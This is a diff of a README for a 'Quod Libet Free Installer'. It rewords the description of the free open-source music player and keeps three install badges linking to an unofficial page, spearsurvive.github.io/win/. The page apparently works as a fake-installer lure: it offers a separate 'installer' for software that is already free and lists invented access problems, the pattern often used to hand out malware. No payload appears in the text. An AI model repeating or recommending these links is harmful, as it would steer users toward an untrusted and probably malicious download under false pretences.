@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Music+Player-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Quod Libet Free Installer** — Quod Libet is a free, open-source music player and library manager for Linux and Windows with powerful tag-based browsing and regex search. Works without internet access, no account required. Full offline installation.
+**💻 Quod Libet Free Installer** — Quod Libet is a free, open-source GTK-based music player for Windows, macOS, and Linux with powerful tag-based library management. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Quod Libet](https://img.shields.io/badge/⬇_Install_Quod%20Libet-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Quod Libet](https://img.shields.io/badge/⬇_Install_Quod+Libet-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Quod Libet
 
-Quod Libet is a free, open-source music player and library manager for Linux and Windows with powerful tag-based browsing and regex search. It supports custom smart playlists, gapless playback, ReplayGain, and a plugin ecosystem for advanced customization.
+Quod Libet is a free, open-source GTK-based music player for Windows, macOS, and Linux with powerful tag-based library management. Features include regex-based library search, smart playlists, Last.fm scrobbling, plugin system, and support for virtually all audio formats. Quod Libet's text-based search approach gives users powerful library query capabilities not found in simpler music players.
 
 ---
 
 ## ❌ Problem: Quod Libet is hard to access
 
-- **Complex Interface** — Tag-based browsing requires understanding of the query language
-- **Linux-Primary** — Windows version less polished and tested
-- **Steep Learning Curve** — Power features require learning a custom query syntax
-- **No Streaming** — Plays only local files; no streaming service support
+- **Interface Design** — GTK interface less native on Windows and macOS
+- **Streaming Services** — No modern streaming platform integration
+- **Learning Curve** — Tag-based search approach requires learning query syntax for full power
+- **Casual Users** — Power features may be overwhelming for casual music listeners
 
 ---
 
@@ -81,7 +81,7 @@ Quod Libet is a free, open-source music player and library manager for Linux and
 
 <div align="center">
 
-[![⬇ Install Quod Libet](https://img.shields.io/badge/⬇_Install_Quod%20Libet-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Quod Libet](https://img.shields.io/badge/⬇_Install_Quod+Libet-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Quod Libet is a free, open-source music player and library manager for Linux and
 
 ---
 
-**Quod Libet Free Installer** — Quod Libet is a free, open-source music player and library manager for Linux and Windows with powerful tag-based browsing and regex search. Install without internet connection today!
+**Quod Libet Free Installer** — Quod Libet is a free, open-source GTK-based music player for Windows, macOS, and Linux with powerful tag-based library management. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Quod Libet](https://img.shields.io/badge/⬇_Install_Quod%20Libet-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Quod Libet](https://img.shields.io/badge/⬇_Install_Quod+Libet-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
